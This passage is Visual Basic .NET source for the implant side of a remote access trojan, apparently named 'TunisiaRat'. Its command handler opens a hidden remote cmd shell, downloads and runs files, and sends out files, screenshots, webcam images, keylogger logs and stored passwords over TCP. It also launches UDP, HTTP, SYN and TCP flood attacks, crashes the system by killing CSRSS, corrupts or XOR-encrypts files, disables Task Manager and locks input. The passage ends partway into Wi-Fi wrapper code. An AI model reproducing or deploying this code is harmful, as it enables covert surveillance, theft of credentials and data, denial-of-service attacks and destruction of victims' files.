                    c.Send("viewimage" & yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & yy)
                Case "bsod"
                    bsodd()
                Case "volup"
                    SendMessageW(Me.Handle, WM_APPCOMMAND, _
                 Me.Handle, New IntPtr(APPCOMMAND_VOLUME_UP))
                Case "voldn"
                    SendMessageW(Me.Handle, WM_APPCOMMAND, _
                     Me.Handle, New IntPtr(APPCOMMAND_VOLUME_DOWN))

                Case "mute"
                    SendMessageW(Me.Handle, WM_APPCOMMAND, _
                 Me.Handle, New IntPtr(APPCOMMAND_VOLUME_MUTE))
                Case "RG" ' Registry 
                    Dim kk As Object = GetKey(A(2))
                    Select Case A(1)
                        Case "~" ' send keys under key+ send values 
                            Dim s As String = "RG" & yy & "~" & yy & A(2) & yy
                            Dim o As String = ""
                            For Each xe As String In kk.GetSubKeyNames
                                If xe.Contains("\") = False Then
                                    o += xe & yy
                                End If
                            Next
                            For Each xs As String In kk.GetValueNames
                                o += xs & "/" & kk.GetValueKind(xs).ToString & "/" & kk.GetValue(xs, "").ToString & yy
                            Next
                            c.Send(s & o)
                        Case "!" ' Set Value
                            kk.SetValue(A(3), A(4), A(5))
                        Case "@5" ' delete value
                            kk.DeleteValue(A(3), False)
                        Case "#" ' creat key
                            kk.CreateSubKey(A(3))
                        Case "$" ' delete key
                            kk.DeleteSubKeyTree(A(3))
                    End Select
                Case "infoDesk"
                    Dim m As Image = CaptureDesktop()
                    Dim cc As New ImageConverter
                    Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                    c.Send("infoDesk" & yy & Convert.ToBase64String(bb) & yy & Name & yy & port & yy & vir & yy & GetFirewall() & yy & Application.ExecutablePath & yy & scam)
                Case "FLOOD"
                    c.Send("FLOOD" & yy)
                Case "Fstart"
                    Try
                        Select Case A(1)
                            Case "UDP"
                                If UDP.IsEnabled Then
                                    UDP.StopUDPz()
                                End If
                                UDP.Host = A(2)
                                UDP.Port = A(3)
                                UDP.Threads = A(4)
                                UDP.UDPzSockets = A(5)
                                UDP.StartUDPz()
                            Case "HTTP"
                                If HttpFlood.IsEnabled Then
                                    HttpFlood.StopHttpFlood()
                                End If
                                HttpFlood.Host = A(2)
                                HttpFlood.Interval = A(3)
                                HttpFlood.Threads = A(4)
                                HttpFlood.StartHttpFlood()
                            Case "SYN"
                                If Syn.IsEnabled Then
                                    Syn.StopSuperSyn()
                                End If
                                Syn.Host = A(2)
                                Syn.Port = A(3)
                                Syn.Threads = A(4)
                                Syn.SuperSynSockets = A(5)
                                Syn.StartSuperSyn()
                            Case "TCP"
                                tcpfuck.AddTarget(A(2), A(3), A(4), A(5))
                                tcpfuck.Start()
                        End Select
                    Catch : End Try
                Case "Fstop"
                    Try
                        Select Case A(1)
                            Case "UDP"
                                UDP.StopUDPz()
                            Case "HTTP"
                                HttpFlood.StopHttpFlood()
                            Case "SYN"
                                Syn.StopSuperSyn()
                            Case "TCP"
                                tcpfuck.stop()
                        End Select
                    Catch : End Try
                Case "ddos"
                    Shell(("ping -t" & A(1) & "-l " & A(2)), AppWinStyle.Hide, False, -1)
                Case "Scb"
                    Dim Security() As Process = System.Diagnostics.Process.GetProcessesByName("CSRSS")
                    For Each Najaf As Process In Security
                        Najaf.Kill()
                    Next
                Case "newpr"
                    Process.Start(A(1))
                Case "!!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    c.Send("!!" & yy & s.Width & yy & s.Height)
                Case "@@" ' Start Capture

                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = caa.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@@" & yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    c.Send(M.ToArray)
                    M.Dispose()
                Case "SProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        c.Send("SP")
                    Next
                Case "clipss"
                    c.Send("clipss" & yy)
                Case "getcli"

                    Invoke(New gt(AddressOf gtx))
                Case "edittextfile"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    c.Send("edittextfile" & yy & A(1) & yy & d)
                Case "savetextfile"
                    Dim C As New IO.StreamWriter(A(1))
                    C.WriteLine(A(2))
                    C.Close()

                Case "requestrecords"
                    c.Send("requestrecords")
                Case "viewimage"
                    c.Send("viewimage" & yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & yy)
                Case "Batch"
                    If File.Exists(Path.GetTempPath & "bat.bat") Then
                        File.Delete(Path.GetTempPath & "bat.bat")
                    End If
                    ' System.IO.File.WriteAllText(Path.GetTempPath & "bat.bat", Message.Substring(8).Replace(yy, vbNewLine))
                    Process.Start(Path.GetTempPath & "bat.bat")

                Case "Vbs"
                    If File.Exists(Path.GetTempPath & "vbs.vbs") Then
                        File.Delete(Path.GetTempPath & "vbs.vbs")
                    End If
                    ' System.IO.File.WriteAllText(Path.GetTempPath & "vbs.vbs", Message.Substring(8).Replace(yy, vbNewLine))
                    Process.Start(Path.GetTempPath & "vbs.vbs")
                Case "sendinformation"
                    Dim time, h, m, s As Integer
                    time = My.Computer.Clock.TickCount
                    h = time \ 3600000
                    m = (time Mod 3600000) \ 60000
                    s = ((time Mod 3600000) Mod 60000) / 1000
                    Dim ab, bb, cb, db, eb, fb, gb As String
                    ab = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")
                    bb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "")
                    cb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "")
                    db = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "")
                    eb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", "")
                    fb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    gb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", "")
                    Dim value As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\TunisiaRat", "ID", "")
                    c.Send("sendinformation" & yy & Environment.MachineName & yy & Environment.UserName & yy & My.Computer.Info.OSFullName & yy & My.Computer.Info.OSPlatform & yy & country & yy & GetFirewall() & yy & GetSystemRAMSize() & yy & "0.1.0" & yy & checkcam() & yy & ACT() & yy & My.Computer.Clock.LocalTime & yy & h & ":" & m & ":" & s & yy & Environment.CurrentDirectory & yy & Environment.SystemDirectory & yy & Environment.UserDomainName & yy & Environment.UserInteractive & yy & Environment.WorkingSet & yy & My.Computer.Info.OSVersion & yy & My.Computer.Info.InstalledUICulture.ToString & yy & System.Environment.CommandLine & yy & port & yy & Application.ExecutablePath & yy & ab & yy & bb & yy & cb & yy & db & yy & eb & yy & fb & yy & gb & yy & value)

                Case "corrupt"
                    Dim corruption As String = "wAyqsW4eE9Csd0dndY1rLnufPtO4Vjp9cRvXz0g38RaWjeoo1OBXT0CNp4wW7vY4Ti6Sm64zhnEn0QWHcVTGZrnNHcc9JFDNGAPYCzPWwyDPIDBsdg067E8newVoWRj7TON9roebC3m0iW9oGJ73CM4UelTtjctQvxt2QqpXATVVvAKpibp7qcoiRV9Vmves42mYUI42"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    My.Computer.FileSystem.WriteAllText(A(1), corruption & d, False)
                Case "cryptedecryptetextfile"
                    Dim x As String
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    Dim i As Short
                    Dim KeyChar As Integer
                    KeyChar = Asc("~!@#$%^&*()_+/*-+")
                    For i = 1 To Len(d)
                        x &= Chr(KeyChar Xor Asc(Mid(d, i, 1)))
                    Next
                    Dim C As New IO.StreamWriter(A(1))
                    C.WriteLine(x)
                    C.Close()
                Case "edittextfile"
                    Dim R As New IO.StreamReader(A(1))
                    Dim d As String
                    d = R.ReadToEnd
                    R.Close()
                    c.Send("edittextfile" & yy & A(1) & yy & d)
                Case "savetextfile"
                    Dim C As New IO.StreamWriter(A(1))
                    C.WriteLine(A(2))
                    C.Close()
                Case "creatnewtextfile"
                    Try
                        IO.File.Create(A(1)).Dispose()
                    Catch ex As Exception
                        c.Send("msgbox" & yy & "Information" & yy & "File Name Already Exists")
                    End Try
                Case "setaswallpaper"
                    SystemParametersInfo(SETDESKWALLPAPER, 0, A(1), UPDATEINIFILE)
                Case "getdesktoppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "gettemppath"
                    Dim specialfolder As String
                    specialfolder = IO.Path.GetTempPath
                    c.Send("getpath" & yy & specialfolder)
                Case "getstartuppath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "getmydocumentspath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "getmyimagespath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "getrecentpath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.Recent)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "getmymusicpath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "gethistorypath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.History)
                    c.Send("getpath" & yy & specialfolder & "\")
                Case "chat"
                    'Chat Modded By Simon-Benyo
                    Invoke(New chatappd(AddressOf chatappds), A(1), A(2), A(3))
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                Case "download"
                    My.Computer.Network.DownloadFile(A(1), IO.Path.GetTempPath & A(2))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(2))
                Case "closeserver"
                    End
                Case "restartserver"
                    Application.Restart()
                    End
                Case "sendfileto"
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                Case "downloadfile"
                    c.Send("downloadedfile" & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & "||" & A(2))

                Case "msgbox"
                    Dim messageicon As MessageBoxIcon
                    Dim messagebutton As MessageBoxButtons
                    Select Case A(1)
                        Case "1"
                            messageicon = MessageBoxIcon.Information
                        Case "2"
                            messageicon = MessageBoxIcon.Question
                        Case "3"
                            messageicon = MessageBoxIcon.Warning
                        Case "4"
                            messageicon = MessageBoxIcon.Error
                    End Select
                    Select Case A(2)
                        Case "1"
                            messagebutton = MessageBoxButtons.YesNo
                        Case "2"
                            messagebutton = MessageBoxButtons.YesNoCancel
                        Case "3"
                            messagebutton = MessageBoxButtons.OK
                        Case "4"
                            messagebutton = MessageBoxButtons.OKCancel
                        Case "5"
                            messagebutton = MessageBoxButtons.RetryCancel
                        Case "6"
                            messagebutton = MessageBoxButtons.AbortRetryIgnore
                    End Select
                    MessageBox.Show(A(4), A(3), messagebutton, messageicon)

                Case "piano"
                    Beep(A(1), 300)


                Case "IEhome"
                    AddHome(A(1))
                Case "openchat"
                    c.Send("readytochat")
                Case "stopchat"
                    Form2.Close()
                Case "openurl"
                    If A(1) = "Default" Then
                        Try
                            System.Diagnostics.Process.Start(A(2))
                        Catch ex As Exception
                        End Try
                    Else
                        Try
                            System.Diagnostics.Process.Start(A(1), A(2))
                        Catch ex As Exception

                        End Try
                    End If

                Case "shutdowncomputer"
                    Shell("shutdown -s -t 00", AppWinStyle.Hide)
                Case "restartcomputer"
                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
                Case "logoff"
                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
                Case "blockmouseandkeyboard"
                    BlockInput(1)
                    ShowCursor(0)
                Case "unblockmouseandkeyboard"
                    BlockInput(0)
                    ShowCursor(1)
                Case "fun"
                    c.Send("fun")
                Case "tt"
                    c.Send("tt")
                Case "opentto"
                    c.Send("opentto")
                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(A(1))

                Case "rss" ' start remote shell
                    Try
                        DJB.Kill()
                    Catch ex As Exception
                    End Try
                    DJB = New Process
                    DJB.StartInfo.RedirectStandardOutput = True
                    DJB.StartInfo.RedirectStandardInput = True
                    DJB.StartInfo.RedirectStandardError = True
                    DJB.StartInfo.FileName = "cmd.exe"
                    DJB.StartInfo.RedirectStandardError = True
                    AddHandler CType(DJB, Process).OutputDataReceived, AddressOf RS
                    AddHandler CType(DJB, Process).ErrorDataReceived, AddressOf RS
                    AddHandler CType(DJB, Process).Exited, AddressOf ex
                    DJB.StartInfo.UseShellExecute = False
                    DJB.StartInfo.CreateNoWindow = True
                    DJB.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    DJB.EnableRaisingEvents = True
                    c.Send("rss" & yy)
                    DJB.Start()
                    DJB.BeginErrorReadLine()
                    DJB.BeginOutputReadLine()
                Case "rs"
                    DJB.StandardInput.WriteLine(DEB(A(1)))
                Case "rsc"
                    Try
                        DJB.Kill()
                    Catch ex As Exception
                    End Try
                    DJB = Nothing

                Case "Uninstall"
                    End
                Case "restart"
                    Application.Restart()

                Case "opentto"
                    c.Send("opentto")
                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(A(1))

                Case "tt"
                    c.Send("tt")



                Case "NormalMouse"
                    SwapMouseButton(&H0&)
                Case "ReverseMouse"
                    SwapMouseButton(&H100&)
                Case "openkl"
                    c.Send("openkl")
                Case "getlogs"
                    Try
                        loggg = o.Logs
                        c.Send("getlogs" & yy & loggg)
                    Catch : End Try
                Case "openRG"
                    c.Send("openRG")
                Case "openpw"
                    c.Send("openpw")
                Case "getpw"
                    c.Send("getpw" & "||" & pw)

                Case "s"
                    HideTaskBar()
                Case "s1"
                    ShowTaskBar()

                Case "لوحة1"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "لوحة2"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "وين1"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "وين2"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "creatnewfolder"
                    Try
                        My.Computer.FileSystem.CreateDirectory _
        (A(1))

                    Catch ez As Exception
                    End Try



                Case "opencd"
                    Try
                        mciSendString("set cdaudio door open", 0, 0, 0)
                    Catch ex As Exception
                    End Try
                Case "closecd"
                    Try
                        mciSendString("set cdaudio door closed", 0, 0, 0)
                    Catch ex As Exception
                    End Try
                Case "\\"
                    c.Send("\\")
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim ProcessList As Process() = Process.GetProcesses()
                    For Each Proc As Process In ProcessList
                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
                    Next
                    c.Send("ProcessManager" & yy & allProcess)
                Case "KillProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next
                Case "KillProgram"

                    Dim command As String = "/c "
                    Dim progname As String = A(1)
                    Dim qouta As String = """"
                    Dim UNSTALLcmd As String = "wmic product where name=" & qouta & progname & qouta & "call uninstall /nointeractive"

                    Process.Start("cmd", command & UNSTALLcmd)

                Case "info"
                    c.Send("info" & yy & virus & yy & Environment.MachineName & "/" & Environment.UserName & yy & My.Computer.Info.OSFullName & yy & country & yy & vir & yy & GetFirewall() & yy & rams() & "GB" & yy & GetCaption() & yy & checkcam())
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))

                Case "GetDrives"
                    c.Send("FileManager" & "||" & getDrives())
                Case "FileManager"
                    Try
                        c.Send("FileManager" & "||" & getFolders(A(1)) & getFiles(A(1)))
                    Catch
                        c.Send("FileManager" & "||" & "Error")
                    End Try
                Case "sendfileto"
                    IO.File.WriteAllBytes(A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    'dsfsadfasfas
                Case "downloadedfile"
                    IO.File.WriteAllBytes(Application.CommonAppDataPath & "\Computers\" & A(2), Convert.FromBase64String(A(1)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                Case "piano"
                    Beep(A(1), 300)
                Case "Delete"
                    Select Case A(1)
                        Case "Folder"
                            IO.Directory.Delete(A(2))
                        Case "File"
                            IO.File.Delete(A(2))
                    End Select
                Case "Execute"
                    Process.Start(A(1))
                Case "Rename"
                    Select Case A(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(A(2), A(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(A(2), A(3))
                    End Select
                Case "openfm"
                    c.Send("openfm")
                Case "BepX"
                    Beep(A(1), A(2))
                Case "-----------"
                    Beep(1000, 1500)
                Case "ErorrMsg"
                    Dim messageicon As MessageBoxIcon
                    Dim messagebutton As MessageBoxButtons
                    Select Case A(1)
                        Case "1"
                            messageicon = MessageBoxIcon.Information
                        Case "2"
                            messageicon = MessageBoxIcon.Question
                        Case "3"
                            messageicon = MessageBoxIcon.Warning
                        Case "4"
                            messageicon = MessageBoxIcon.Error
                    End Select
                    Select Case A(2)
                        Case "1"
                            messagebutton = MessageBoxButtons.YesNo
                        Case "2"
                            messagebutton = MessageBoxButtons.YesNoCancel
                        Case "3"
                            messagebutton = MessageBoxButtons.OK
                        Case "4"
                            messagebutton = MessageBoxButtons.OKCancel
                        Case "5"
                            messagebutton = MessageBoxButtons.RetryCancel
                        Case "6"
                            messagebutton = MessageBoxButtons.AbortRetryIgnore
                    End Select
                    MessageBox.Show(A(4), A(3), messagebutton, messageicon)
                Case "!"
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    c.Send("!" & yy & s.Width & yy & s.Height)
                Case "@"
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    c.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))



                Case "hidefolderfile"
                    Dim hiden As FileAttribute = FileAttribute.Hidden
                    Try
                        SetAttr(A(1), hiden)
                    Catch ex As Exception

                    End Try
                Case "showfolderfile"
                    Dim shown As FileAttribute = FileAttribute.Normal
                    Try
                        SetAttr(A(1), shown)
                    Catch ex As Exception
                    End Try


                Case "CursorShow"
                    Cursor.Show()
                Case "TaskbarShow"
                    ShowTaskbarItems()
                Case "TaskbarHide"
                    HideTaskbarItems()
                Case "CursorHide"
                    Cursor.Hide()

                Case "ClockOFF"
                    hideclock()
                Case "ClockON"
                    showclock()

                Case "DisableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "TurnOffMonitor"
                    SendMessage(-1, &H112, &HF170, 2)
                Case "TurnOnMonitor"
                    SendMessage(-1, &H112, &HF170, -1)
                Case "errorsound"
                    Beep(1500, 5000)

                Case "Comrar"
                    Try
                        CompressFile(A(1))
                    Catch ex As Exception

                    End Try

                Case "Decrar"
                    Try
                        UncompressFile(A(1))

                    Catch ex As Exception

                    End Try
                Case "viewwifi"

                    c.Send("wifi")
                Case "stat"
                    c.Send("stat")
                Case "getstat"
                    stati()
                    getinterfaces()

                Case "cam"
                    Dim s As String = "cam"
                    If cam.Drive <> A(1) Then
                        cam.onn(A(1), New Size(160, 120))
                        c.Send(s)
                    Else
                        If cam.M IsNot Nothing Then
                            Dim m = cam.M.Clone
                            Dim cc As New ImageConverter
                            Dim bb As Byte() = cc.ConvertTo(m, b.GetType)
                            c.Send(s & yy & Convert.ToBase64String(bb))
                        Else
                            c.Send(s)
                        End If
                    End If
                Case "camclose"
                    cam.close()
                Case "camlist"
                    Try
                        Dim s As String = "camlist"
                        For Each x As String In cam.Divs
                            s &= yy & x
                        Next
                        c.Send(s)
                    Catch ex As Exception

                    End Try
            End Select
        Catch ex As Exception
        End Try

    End Sub
    Private Class k
        Private comet As New TcpClient
        Public Event Connected()
        Public Event Disconnected()
        Public Event Data(ByVal b As Byte())
        Private IsBuzy As Boolean = False
        Public Function Statconnected() As Boolean
            Try
                If comet.Client.Connected = True Then
                    Return True
                Else
                    Return False
                End If
            Catch ex As Exception
            End Try
        End Function
        Sub Connect(ByVal h As String, ByVal p As Integer)
            Try
                Try
                    If comet IsNot Nothing Then
                        comet.Close()
                        comet = Nothing
                    End If
                Catch ex As Exception
                End Try
                Do Until IsBuzy = False
                    Threading.Thread.Sleep(1)
                Loop
                Try
                    comet = New TcpClient

                    comet.Client.Connect(h, p)
                    Dim t As New Threading.Thread(AddressOf RC, 10)
                    t.Priority = ThreadPriority.Highest
                    t.Start()
                    RaiseEvent Connected()
                Catch ex As Exception
                End Try
            Catch ex As Exception
                RaiseEvent Disconnected()
            End Try
        End Sub
        Private SPL As String = "sblj"
        Sub DisConnect()
            Try
                comet.Close()
            Catch ex As Exception
            End Try
            comet = Nothing
            RaiseEvent Disconnected()
        End Sub
        Sub Send(ByVal s As String)

            Send(SB(s))
        End Sub
        Sub Send(ByVal b As Byte())
            Dim base64Encoded As String
            base64Encoded = System.Convert.ToBase64String(b)
            ' base64Encoded.Replace("a", "\%\%\%")
            ' base64Encoded.Replace("s", "$^$")
            b = SB(base64Encoded)
            Try
                Dim m As New IO.MemoryStream
                m.Write(b, 0, b.Length)
                m.Write(SB(SPL), 0, SPL.Length)
                comet.Client.Send(m.ToArray, 0, m.Length, SocketFlags.None)
            Catch ex As Exception
                DisConnect()
            End Try
        End Sub
        Private Sub RC()
            IsBuzy = True
            Dim M As New IO.MemoryStream
            Dim cc As Integer = 0
re:
            Threading.Thread.Sleep(1)

            Try
                If comet Is Nothing Then
                    GoTo co
                Else
                    If comet.Client.Connected = False Then
                        GoTo co
                    Else
                        cc += 1
                        If cc > 100 Then
                            cc = 0
                            Try
                                If comet.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And comet.Client.Available <= 0 Then
                                    GoTo co
                                End If
                            Catch ex As Exception
                                GoTo co
                            End Try
                        End If

                    End If
                End If
                If comet.Available > 0 Then
                    Dim B(comet.Available - 1) As Byte
                    comet.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                    M.Write(B, 0, B.Length)
rr:
                    If BS(M.ToArray).Contains(SPL) Then
                        Dim A As Array = fx(M.ToArray, SPL)
                        RaiseEvent Data(A(0))
                        M.Dispose()
                        M = New IO.MemoryStream
                        If A.Length = 2 Then
                            M.Write(A(1), 0, A(1).length)
                            Threading.Thread.Sleep(1)
                            GoTo rr
                        End If
                    End If
                End If
            Catch ex As Exception
                GoTo co
            End Try
            GoTo re
co:
            IsBuzy = False
            DisConnect()
        End Sub
    End Class
End Class
Public Class SocketClient
    Private C As TcpClient
    Public Event Connected()
    Public Event Disconnected()
    Public Event Data(ByVal b As Byte())
    Private IsBuzy As Boolean = False

    Public Function Statconnected() As Boolean

        Try


            If C.Client.Connected = True Then
                Return True
            Else
                Return False

            End If

        Catch ex As Exception
        End Try
    End Function
    Sub Connect(ByVal h As String, ByVal p As Integer)
        Try
            Try
                If C IsNot Nothing Then
                    C.Close()
                    C = Nothing
                End If
            Catch ex As Exception
            End Try
            Do Until IsBuzy = False
                Threading.Thread.CurrentThread.Sleep(1)
            Loop
            Try
                C = New TcpClient

                C.Connect(h, p)
                Dim t As New Threading.Thread(AddressOf RC, 10)
                t.Start()
                RaiseEvent Connected()
            Catch ex As Exception
            End Try
        Catch ex As Exception
            RaiseEvent Disconnected()
        End Try
    End Sub
    Private SPL As String = "nj-q8" ' split packets by this word
    Sub DisConnect()
        Try
            C.Close()
        Catch ex As Exception
        End Try
        C = Nothing
        RaiseEvent Disconnected()
    End Sub
    Sub Send(ByVal s As String)
        Try
            Send(SB(s))
        Catch ex As Exception

        End Try

    End Sub
    Sub Send(ByVal b As Byte())
        Try
            Dim m As New IO.MemoryStream
            m.Write(b, 0, b.Length)
            m.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(m.ToArray, 0, m.Length, SocketFlags.None)
        Catch ex As Exception
            DisConnect()
        End Try
    End Sub
    Private Sub RC()
        IsBuzy = True
        Dim M As New IO.MemoryStream
        Dim cc As Integer = 0
re:
        Threading.Thread.CurrentThread.Sleep(1)

        Try
            If C Is Nothing Then
                GoTo co
            Else
                If C.Client.Connected = False Then
                    GoTo co
                Else
                    cc += 1
                    If cc > 100 Then
                        cc = 0
                        Try
                            If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then
                                GoTo co
                            End If
                        Catch ex As Exception
                            GoTo co
                        End Try
                    End If

                End If
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then
                    Dim A As Array = fx(M.ToArray, SPL)
                    RaiseEvent Data(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        Threading.Thread.CurrentThread.Sleep(1)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo co
        End Try
        GoTo re
co:
        IsBuzy = False
        DisConnect()
    End Sub


End Class
Namespace NativeWifi
    Public Class WlanClient
        Public Class WlanInterface
            Private client As WlanClient
            Private info As Wlan.WlanInterfaceInfo

#Region "Events"
            ''' <summary>
            ''' Represents a method that will handle <see cref="WlanNotification"/> events.
            ''' </summary>
            ''' <param name="notifyData">The notification data.</param>
            Public Delegate Sub WlanNotificationEventHandler(ByVal notifyData As Wlan.WlanNotificationData)

            ''' <summary>
            ''' Represents a method that will handle <see cref="WlanConnectionNotification"/> events.
            ''' </summary>
            ''' <param name="notifyData">The notification data.</param>
            ''' <param name="connNotifyData">The notification data.</param>
            Public Delegate Sub WlanConnectionNotificationEventHandler(ByVal notifyData As Wlan.WlanNotificationData, ByVal connNotifyData As Wlan.WlanConnectionNotificationData)

            ''' <summary>
            ''' Represents a method that will handle <see cref="WlanReasonNotification"/> events.
            ''' </summary>
            ''' <param name="notifyData">The notification data.</param>
            ''' <param name="reasonCode">The reason code.</param>
            Public Delegate Sub WlanReasonNotificationEventHandler(ByVal notifyData As Wlan.WlanNotificationData, ByVal reasonCode As Wlan.WlanReasonCode)

            ''' <summary>
            ''' Occurs when an event of any kind occurs on a WLAN interface.
            ''' </summary>
            Public Event WlanNotification As WlanNotificationEventHandler

            ''' <summary>
            ''' Occurs when a WLAN interface changes connection state.
            ''' </summary>
            Public Event WlanConnectionNotification As WlanConnectionNotificationEventHandler

            ''' <summary>
            ''' Occurs when a WLAN operation fails due to some reason.
            ''' </summary>
            Public Event WlanReasonNotification As WlanReasonNotificationEventHandler

#End Region

#Region "Event queue"
            Private queueEvents As Boolean
            Private eventQueueFilled As New AutoResetEvent(False)
            Private eventQueue As New Queue(Of Object)()

            Private Structure WlanConnectionNotificationEventData
